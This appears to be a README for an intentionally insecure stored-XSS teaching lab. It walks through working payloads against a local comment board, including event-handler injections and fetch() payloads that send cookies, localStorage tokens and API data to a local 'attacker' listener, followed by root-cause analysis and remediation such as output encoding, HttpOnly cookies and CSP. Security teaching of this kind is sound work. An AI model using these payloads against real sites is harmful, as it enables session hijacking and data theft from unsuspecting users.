# 🧪 XSS Lab — Stored Cross-Site Scripting Demonstration

A deliberately vulnerable comment board application built to **teach** how Stored XSS works — and how to defend against it.

> ⚠️ **WARNING — Intentionally Insecure**
> This application has **no input sanitization and no output encoding** by design.
> It exists **only** for local, isolated, educational use.
> **Never** deploy this to a public server, a shared network, or any environment
> where real users or real data are present.

---

## 📋 Table of Contents

- [What This Lab Teaches](#-what-this-lab-teaches)
- [Project Structure](#-project-structure)
- [Prerequisites](#-prerequisites)
- [Installation & Running](#-installation--running)
  - [Option A: Node.js (Express)](#option-a-nodejs-express)
  - [Option B: Python (Flask)](#option-b-python-flask)
- [Using the App](#-using-the-app)
- [Exploitation Walkthrough](#-exploitation-walkthrough)
  - [Step 1 — Confirm Basic Execution](#step-1--confirm-basic-execution)
  - [Step 2 — Demonstrate Persistence](#step-2--demonstrate-persistence)
  - [Step 3 — Cookie Theft](#step-3--cookie-theft)
  - [Step 4 — Session Hijacking Scenario](#step-4--session-hijacking-scenario)
- [Why Reload Triggers the Payload](#-why-reload-triggers-the-payload)
- [Root Cause Analysis](#-root-cause-analysis)
- [How to Fix It (Remediation)](#-how-to-fix-it-remediation)
- [API Reference](#-api-reference)
- [Resetting the Lab](#-resetting-the-lab)
- [Safety & Scope](#-safety--scope)
- [License](#-license)

---

## 🎯 What This Lab Teaches

This project demonstrates **Stored XSS** (also called Persistent XSS) end-to-end:

| Concept | What you'll observe |
|---|---|
| **Unsanitized input** | The server stores user input verbatim — no filtering, no encoding |
| **Vulnerable output** | The client renders stored data with `innerHTML` |
| **Persistence** | The payload survives page reloads and browser restarts |
| **Victim scope** | Anyone who visits the page executes the attacker's script |
| **Impact** | Cookie theft, session hijacking, DOM manipulation, data exfiltration |

The application is a simple **comment board** — but the vulnerability is exactly the class of bug that has appeared in real-world guestbooks, forums, and profile pages.

---

## 📁 Project Structure

```
xss-lab/
├── README.md ← this file
├── package.json ← Node.js dependencies
├── server.js ← Express server (vulnerable API)
└── public/
└── index.html ← Comment board UI (vulnerable rendering)
```

---

## ✅ Prerequisites

- **Node.js** ≥ 16 (for the Express version), **or**
- **Python** ≥ 3.8 with `pip` (for the Flask version)
- A modern browser (Chrome, Firefox, Edge — all fine)
- A terminal / command prompt

You do **not** need a database — comments are held in memory and reset when the server restarts.

---

## 🚀 Installation & Running

### Option A: Node.js (Express)

```
# 1. Create the project folder
mkdir xss-lab && cd xss-lab

# 2. Create the files listed in the "Project Structure" section
#    (package.json, server.js, public/index.html)

# 3. Install dependencies
npm install

# 4. Start the server
npm start
```

Expected output:

```
  XSS Lab running at http://localhost:3000
  WARNING: Intentionally vulnerable. Local use only.
```

### Option B: Python (Flask)

```
# 1. Create the project folder
mkdir xss-lab && cd xss-lab

# 2. Create app.py and public/index.html

# 3. Install Flask
pip install flask

# 4. Start the server
python app.py
```

Expected output:

```
 * Running on http://127.0.0.1:3000
```

### Open the app
Navigate to http://localhost:3000 in your browser.

You should see a red warning banner, a comment form, and an empty comment list.

---

## 🖱️ Using the App
- (Optional) Enter a name.
- Type a message in the textarea and click Post Comment.
- The comment appears immediately below the form.
- Refresh the page — comments are loaded from the server and re-rendered.

That "load → render" cycle is exactly where the vulnerability lives. Keep that in mind as you go through the exploitation steps.

---

## 💥 Exploitation Walkthrough

> All payloads below target your own localhost. They are teaching examples, not
> tools for use against systems you don't own.

### Step 1 — Confirm Basic Execution
Important nuance: Modern browsers do not execute `<script>` tags inserted via `innerHTML`. So the "classic" payload below will not fire in this app:

```
<script>alert('XSS')</script>   <!-- does NOT execute via innerHTML -->
```

Instead, use a payload that executes when the browser parses it through innerHTML. Try each of these:

#### Payload 1 — Image error handler (most reliable):

```
<img src=x onerror="alert('XSS')">
```

#### Payload 2 — SVG load event:

```
<svg onload="alert('XSS')">
```

#### Payload 3 — Iframe with javascript: URI:

```
<iframe src="javascript:alert('XSS')"></iframe>
```

What to observe:

- Paste one into the message box, click Post Comment.
- Reload the page — the alert fires.
- Open the page in a second browser — the alert fires there too.

✅ If you see the alert, you have confirmed Stored XSS.

---

### Step 2 — Demonstrate Persistence
This step proves the payload is stored server-side, not just reflected in your current tab.

- Post the payload: `<img src=x onerror="alert('XSS')">`
- Close the browser tab completely.
- Reopen http://localhost:3000.
- The alert fires again, before you interact with anything.

**Why it works:** on every page load, the client calls `GET /api/comments`, receives the stored raw HTML, and passes it to `innerHTML`. The browser parses the string fresh each time — so the payload re-executes on every visit.

**Teaching point:** With Reflected XSS, a victim must click a crafted link. With Stored XSS, no link is needed — anyone who visits the page is a victim.

---

### Step 3 — Cookie Theft
This step shows how an attacker exfiltrates session data.

#### 3a. Set a "session" cookie for the demo
Open DevTools → Console on `http://localhost:3000`:

```
document.cookie = "session=demo-secret-token-123; path=/";
```

Confirm it's set:

```
console.log(document.cookie);
// → session=demo-secret-token-123
```

> ⚠️ Real-world note: Production session cookies should be marked `HttpOnly`,
> which prevents JavaScript from reading them. We're using a JS-readable cookie here
> so the demo works. Discussing `HttpOnly` as a defense is the point of this step.

#### 3b. Start a local exfiltration listener
Open a second terminal and run a tiny HTTP listener on port 4000:

```
node -e "require('http').createServer((q,r)=>{console.log('STOLEN:',q.url);r.end('ok')}).listen(4000)"
```

Leave it running. It will log any incoming requests.

#### 3c. Post the exfiltration payload
Submit this as a comment:

```
<img src=x onerror="fetch('http://localhost:4000/steal?c='+encodeURIComponent(document.cookie))">
```

Then reload the page.

#### 3d. Watch the result
In your listener terminal, you should see:

```
STOLEN: /steal?c=session%3Ddemo-secret-token-123
```

The URL-decoded version is `session=demo-secret-token-123` — the victim's session token, now in the attacker's hands.

---

### Step 4 — Session Hijacking Scenario (Advanced)
To make the impact concrete, you can simulate a full session-hijack flow:

**The setup:**

- App runs on `http://localhost:3000` (the "victim" app).
- Attacker listener runs on `http://localhost:4000` (the "attacker" server).

**The flow:**

- A victim (e.g., a logged-in admin) visits the comment board.
- The stored payload fires in their browser.
- The payload runs a script that calls the victim app's API as that victim and sends the response to the attacker.

**Example payload** — exfiltrate the victim's view of all comments:

```
<img src=x onerror="fetch('/api/comments').then(r=>r.text()).then(t=>fetch('http://localhost:4000/exfil?d='+encodeURIComponent(t)))">
```

**Example payload** — exfiltrate `localStorage` (if the app stored a token there):

```
<img src=x onerror="fetch('http://localhost:4000/exfil?d='+encodeURIComponent(localStorage.getItem('token')||'none'))">
```
**Teaching point:** Because the script runs on the app's origin, it inherits the victim's authenticated session. Anything the victim could do on the page, the attacker's script can do — including reading private data and making state-changing requests (CSRF-style actions with stolen credentials).

---

## 🔁 Why Reload Triggers the Payload
A common misconception is that the browser "re-executes" the stored script. In reality, on every page load the script is re-injected into a fresh document:

```
Browser loads page
        │
        ▼
HTML document parsed → <script> in index.html runs
        │
        ▼
load() → fetch('/api/comments')
        │
        ▼
Server returns JSON: [{ message: "<img src=x onerror=...>" }, ...]
        │
        ▼
render() → commentsEl.innerHTML = "...<img src=x onerror=...>..."
        │
        ▼
Browser parses the new HTML string
        │
        ▼
<img onerror> fires → payload executes
```
Every reload → new `fetch` → new `innerHTML` assignment → new parse → new execution. This is why the payload is persistent from the attacker's perspective: they don't need to re-deliver it.

---

## 🔍 Root Cause Analysis

| Stage |	What happens | Why it's exploitable |
|---|---|---|
| **Input** |	`POST /api/comments` accepts `message` verbatim | No validation, no encoding, no length limit |
| **Storage** |	The raw string is kept in memory | Malicious HTML/JS is preserved exactly |
| **Output** | `commentsEl.innerHTML = ...c.message...` |	Browser parses it as HTML; inline event handlers execute |
| **Execution context** |	Runs as the `localhost:3000` origin |	Full access to DOM, cookies (non-HttpOnly), `localStorage`, and same-origin APIs |
| **Trigger** |	`load()` runs on every visit |	Payload re-injected into every fresh document |

The bug is not the `<script>` tag specifically — it's that untrusted data is treated as HTML. Any construct that the HTML parser can execute (event handlers, `javascript:` URIs, `<svg onload>`, etc.) is fair game.

---

## 🛡️ How to Fix It (Remediation)

This lab intentionally omits every one of these. In a real application, apply all of them:

### 1. Encode on output — never use `innerHTML` for untrusted data
**Vulnerable:**

```
commentsEl.innerHTML = `<div>${c.message}</div>`;
```

Safe:

```
const div = document.createElement('div');
div.textContent = c.message;
commentsEl.appendChild(div);
```

If you must render HTML, sanitize it first with DOMPurify:

```
import DOMPurify from 'dompurify';
commentsEl.innerHTML = DOMPurify.sanitize(c.message);
```

### 2. Set safe cookie attributes
```
Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax
```

- `HttpOnly` — JavaScript cannot read the cookie (blocks cookie theft)
- `Secure` — cookie only sent over HTTPS
- `SameSite` — blocks cross-site request attacks

### 3. Add a strict Content Security Policy
```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-<random>';
  object-src 'none';
  base-uri 'none';
```

No `'unsafe-inline'` — this alone stops the `onerror/onload` payloads in this lab.

### 4. Validate input on the server (defense in depth)
- Enforce a max length.
- Reject or strip HTML for plain-text fields.
- Never rely on client-side validation.

### 5. Use framework protections
- React: `{message}` (not `dangerouslySetInnerHTML`)
- Vue: `{{ message }}` (not `v-html`)
- Angular: default interpolation (not `[innerHTML]` without sanitizer)
- Express + template engines: use the engine's auto-escaping (EJS `<%= %>`, Pug `#{}`, Handlebars `{{ }}`)

---

## 📡 API Reference

| Method | Endpoint | Description |
|---|---|---|
| `GET` | `/api/comments` | Returns all comments as a JSON array |
| `POST` | `/api/comments` | Creates a comment. Body: `{ "name": "...", "message": "..." }` |
| `POST` |	`/api/reset` |	Clears all stored comments (lab convenience) |

**Example — post a comment:**

```
curl -X POST http://localhost:3000/api/comments \
  -H "Content-Type: application/json" \
  -d '{"name":"student","message":"<img src=x onerror=alert(1)>"}'
```

**Example — fetch all comments:**

```
curl http://localhost:3000/api/comments
```

---

## 🔄 Resetting the Lab
To clear all stored comments between exercises:

```
curl -X POST http://localhost:3000/api/reset
```

Or simply **stop and restart the server** — comments are in-memory and will be gone.

---

## ⚠️ Safety & Scope

- Bind to `127.0.0.1` only. Never port-forward, never expose on a LAN, never publish.
- Do not use real credentials in this lab. The "session cookie" is fake.
- Do not run this on shared infrastructure — a malicious payload from another user could affect your browser.
- Payloads in this **README** target only `localhost`. They are educational examples, not tools for attacking third-party systems.
- Using XSS against systems you do not own or have explicit written permission to test is illegal in most jurisdictions (e.g., under the Computer Fraud and Abuse Act in the US, the Computer Misuse Act in the UK, and equivalent laws elsewhere).

If you're studying for a certification (OSCP, CEH, PortSwigger Web Security Academy, etc.), use this **lab** alongside those **curricula** — but keep it offline.

---

## 📄 License
This lab is provided for educational purposes only. Use it freely for self-study, classroom instruction, or internal training. The authors accept no liability for misuse.

**Happy hacking — responsibly.** 🛡️
